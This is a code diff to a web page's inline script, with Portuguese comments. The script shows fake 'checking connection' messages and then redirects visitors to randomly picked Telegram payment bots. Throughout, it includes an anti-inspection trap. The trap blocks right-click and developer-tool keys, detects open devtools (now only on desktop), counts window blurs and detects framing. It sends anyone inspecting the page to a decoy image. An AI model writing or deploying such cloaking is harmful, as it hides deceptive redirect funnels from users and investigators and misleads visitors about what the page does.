@@ -85,7 +85,7 @@
 <script>
 (()=>{
 
-  // Links de destino (ocultos)
+  // === Links destino (bots) ===
   const bots=[
     "https://t.me/tacofire_pay108b9x_bot?start=go",
     "https://t.me/pizzalove_pay105q8z_bot?start=go",
@@ -93,18 +93,31 @@
     "https://t.me/pancakechoco_pay101v7k_bot?start=go"
   ];
 
-  // Armadilha anti-inspeção
+  // === Armadilha anti-inspeção ===
   const trap="https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";
   let detected=false;
   const kill=()=>{if(!detected){detected=true;location.replace(trap)}};
 
+  // bloqueia clique direito e teclas de inspeção
   document.addEventListener('contextmenu',e=>{e.preventDefault();kill()},{passive:false});
   document.addEventListener('keydown',e=>{
-    const k=e.key||'';if(k==='F12'||(e.ctrlKey&&e.shiftKey&&'IJC'.includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){e.preventDefault();kill()}
+    const k=e.key||'';
+    if(k==='F12'||(e.ctrlKey&&e.shiftKey&&'IJC'.includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){
+      e.preventDefault();kill();
+    }
   },{passive:false});
-  let d=0;setInterval(()=>{const w=window.outerWidth-window.innerWidth,h=window.outerHeight-window.innerHeight;if((w>160||h>160)&&++d>1)kill()},1100);
 
-  // Atualiza status dinamicamente
+  // detecção de devtools (somente desktop)
+  let d=0;
+  setInterval(()=>{
+    const isMobile=/Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
+    if(isMobile) return; // ignora iPhone / Android
+    const w=window.outerWidth-window.innerWidth,
+          h=window.outerHeight-window.innerHeight;
+    if((w>160||h>160)&&++d>1) kill();
+  },1100);
+
+  // === Animação / Status ===
   const status=document.getElementById('status');
   const msgs=["Preparando 🔥","Verificando conexão...","Aquecendo 🔥","Redirecionando..."];
   let i=0;
@@ -113,7 +126,7 @@
     else clearInterval(change);
   },700);
 
-  // Redireciona após animação
+  // === Redirecionamento ===
   setTimeout(()=>{
     if(detected) return;
     const target=bots[Math.floor(Math.random()*bots.length)];
@@ -124,8 +137,9 @@
     setTimeout(()=>location.replace(target),250);
   },2600);
 
-  // Proteção extra
-  let blurC=0;window.addEventListener('blur',()=>{if(++blurC>4)kill()});
+  // === Proteções extras ===
+  let blurC=0;
+  window.addEventListener('blur',()=>{if(++blurC>4)kill()});
   try{if(window.top!==window.self)window.top.location=window.self.location}catch(e){}
   try{if(document.location.ancestorOrigins&&document.location.ancestorOrigins.length)kill()}catch(e){}
 
